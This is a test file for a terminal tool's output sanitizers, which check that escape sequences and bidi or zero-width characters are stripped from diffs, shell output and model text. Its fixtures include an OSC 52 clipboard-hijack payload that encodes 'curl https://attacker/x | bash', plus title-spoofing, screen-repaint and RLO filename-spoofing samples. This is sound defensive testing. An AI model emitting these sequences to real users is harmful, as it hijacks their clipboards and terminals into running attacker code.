import { beforeAll, describe, expect, it } from "vitest";
import { renderDiff } from "../src/modes/interactive/components/diff.ts";
import { sanitizeForDisplay } from "../src/modes/interactive/components/display-text.ts";
import { initTheme } from "../src/modes/interactive/theme/theme.ts";
import { sanitizeBinaryOutput } from "../src/utils/shell.ts";

beforeAll(() => {
	// renderDiff styles through the global theme proxy.
	initTheme("dark");
});

const ESC = "\u001b";
const BEL = "\u0007";
const ST = `${ESC}\\`;

/** OSC 52: overwrite the user's clipboard with an attacker-chosen command. */
const OSC52 = `${ESC}]52;c;Y3VybCBodHRwczovL2F0dGFja2VyL3ggfCBiYXNo${BEL}`;
/** OSC 0: spoof the window title. */
const OSC0 = `${ESC}]0;spoofed${BEL}`;
/** CSI: move the cursor / repaint to fake output. */
const CSI = `${ESC}[2J${ESC}[1;1H`;

describe("sanitizeBinaryOutput", () => {
	it("strips the escape sequences a terminal would execute", () => {
		for (const payload of [OSC52, OSC0, CSI]) {
			expect(sanitizeBinaryOutput(payload)).not.toContain(ESC);
		}
	});

	it("strips DEL, C1 controls, and bidi/zero-width marks", () => {
		expect(sanitizeBinaryOutput("a\u007fb")).toBe("ab"); // DEL
		// The introducer is removed; the printable remainder stays as inert text,
		// because a CSI/OSC without its ESC (or C1 equivalent) is not interpreted.
		expect(sanitizeBinaryOutput(`a${ESC}[2J`)).toBe("a[2J"); // C0 CSI
		expect(sanitizeBinaryOutput("a\u009bb")).toBe("ab"); // C1 CSI
		expect(sanitizeBinaryOutput("a\u009db")).toBe("ab"); // C1 OSC
		expect(sanitizeBinaryOutput("a‮b")).toBe("ab"); // RLO
		expect(sanitizeBinaryOutput("a​b")).toBe("ab"); // ZWSP
		expect(sanitizeBinaryOutput("a⁦b")).toBe("ab"); // LRI
		expect(sanitizeBinaryOutput("a﻿b")).toBe("ab"); // BOM
		expect(sanitizeBinaryOutput("a؜b")).toBe("ab"); // ARABIC LETTER MARK
	});

	it("keeps text, tabs, newlines and carriage returns", () => {
		expect(sanitizeBinaryOutput("a\tb\nc\rd")).toBe("a\tb\nc\rd");
		expect(sanitizeBinaryOutput("héllo 世界 🎉")).toBe("héllo 世界 🎉");
	});

	it("keeps ZWNJ/ZWJ, which join emoji and carry meaning in Arabic/Indic scripts", () => {
		// Neither reorders text, so neither is a spoofing vector — but stripping
		// them breaks multi-codepoint emoji (👨‍👩‍👧) into separate glyphs and
		// changes spelling in Persian/Arabic/Indic text. The bidi overrides,
		// ZWSP, LRM and RLM stay removed.
		const family = "\u{1F468}‍\u{1F469}‍\u{1F467}";
		expect(sanitizeBinaryOutput(family)).toBe(family);
		expect(sanitizeBinaryOutput("a‌b")).toBe("a‌b");
	});

	it("neutralizes the filename spoofing case", () => {
		// A repo file named "gnp<RLO>.exe" renders as "gnp.exe" reversed to look
		// like "exe.png"; stripping the override makes the stored order visible.
		expect(sanitizeBinaryOutput("gnp‮exe")).toBe("gnpexe");
	});
});

/** The diff renderer styles lines with SGR color codes, which are its own legitimate escapes. */
const stripThemeSgr = (text: string) => text.replace(/\u001b\[[0-9;]*m/g, "");

describe("renderDiff", () => {
	it("does not emit a terminal escape carried by file content", () => {
		// Removed/context lines are copied verbatim from the file on disk, so a
		// repository controls these bytes without any model cooperation.
		const diff = [
			"--- a/notes.md",
			"+++ b/notes.md",
			`-old line ${OSC52}`,
			`+new line ${CSI}`,
			` context ${OSC0}`,
		].join("\n");

		// Once the renderer's own SGR styling is removed, no escape may remain —
		// anything left would be the payload's. An OSC/CSI without its leading
		// ESC is inert text on screen, so the payload's remaining characters are
		// harmless; what matters is that no introducer survived.
		const plain = stripThemeSgr(renderDiff(diff));

		expect(plain).not.toContain(ESC);
		// The line content itself is still shown, rather than being dropped.
		expect(plain).toContain("old line");
		expect(plain).toContain("new line");
	});

	it("still renders the ordinary diff content", () => {
		const plain = stripThemeSgr(renderDiff("--- a/x\n+++ b/x\n-old\n+new"));
		expect(plain).toContain("old");
		expect(plain).toContain("new");
	});
});

describe("sanitizeForDisplay", () => {
	it("is the boundary applied to model, skill and session text", () => {
		expect(sanitizeForDisplay(`answer ${OSC52} done`)).not.toContain(ESC);
		expect(sanitizeForDisplay(`answer ${OSC52} done`)).toContain("done");
	});
});
